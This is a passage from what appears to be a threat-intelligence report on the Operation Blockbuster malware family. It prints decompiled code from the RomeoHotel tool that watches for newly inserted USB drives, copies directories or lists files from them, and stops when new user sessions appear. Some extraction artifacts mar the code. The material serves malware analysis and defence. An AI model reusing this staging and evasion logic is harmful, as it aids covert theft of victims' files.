@@ -1,0 +1,68 @@
+Operation Blockbuster: Remote Administration Tools and Content Staging Malware Report 34
+void __cdecl PostConnectionActivities(int dwMaxDrives)
+  {
+wchar_t wszRootPath[6] = L "::\\";
+DWORD dwPrevDriveMask = GetLogicalDrives();
+WTS_SESSION_INFO *pSessionInfos = 0;
+HMODULE hWtsapi32 = LoadLibraryA( " Wtsapi32.dll ");
+pfnWTSEnumerateSessionsA = GetProcAddress(hWtsapi32,
+"WTSEnumerateSessionsA");
+  if ( pfnWTSEnumerateSessionsA )
+  pfnWTSEnumerateSessionsA(0, 0, 1, &pSessionInfos, &dwSessionCnt);
+  for ( i = 0; i < dwMaxDrives; ++i )
+  {
+DWORD dwDrivesMask = GetLogicalDrives();
+if ( dwDrivesMask > dwPrevDriveMask )
+{
+DWORD dwDriveMaskDiff = dwDrivesMask - dwPrevDriveMask;
+g_connectionState = 3;
+DWORD dwDriveIndex = 2;
+while ( !((dwDriveMaskDiff >> dwDriveIndex) & 1) )
+{
+if ( ++dwDriveIndex >= 26 )
+goto LABEL_10;
+  }
+  wszRootPath[0] = dwDriveIndex + 'A';
+  LABEL_10:
+  wprintf(L"USB Volumn = %s\r\n", wszRootPath);
+dwPostConnectionActivityMode = config.dwPostConnectionActivityMode;
+if ( config.dwPostConnectionActivityMode == 3
+|| config.dwPostConnectionActivityMode == 5
+|| config.dwPostConnectionActivityMode == 6 )
+{
+  CreateThread(0, 0, DuplicateDirectoriesThread, wszRootPath, 0, 0);
+  Sleep(1000);
+dwPostConnectionActivityMode = config.dwPostConnectionActivityMode;
+}
+  if ( dwPostConnectionActivityMode == 2
+  || dwPostConnectionActivityMode == 4
+|| dwPostConnectionActivityMode == 6 )
+{
+  GetDrivesFileListAndSaveToFile(wszRootPath);
+dwPostConnectionActivityMode = config.dwPostConnectionActivityMode;
+}
+  if ( dwPostConnectionActivityMode == 1
+  || dwPostConnectionActivityMode == 4
+  || dwPostConnectionActivityMode == 5 )
+break;
+}
+dwPrevDriveMask = dwDrivesMask;
+if ( pfnWTSEnumerateSessionsA )
+  {
+  pfnWTSEnumerateSessionsA(0, 0, 1, &pSessionInfos, &pdwActiveSessions);
+  if ( pdwActiveSessions > dwSessionCnt
+&& config.fAbortPostConnectionActivityOnNewTSSessions == 1 )
+{
+  g_connectionState = 4;
+  return;
+  }
+  dwSessionCnt = pdwActiveSessions;
+  }
+Sleep(60000);
+```
+  }
+  }
+```
+Figure 10-1: RomeoHotel’s Post MessageThread/Disconnect Activity Function
+The function in Figure 10-1 enumerates the logical drives on the victim’s system and potentially performs up to three
+tasks based on the value set within the configuration data structure for each logical drive.
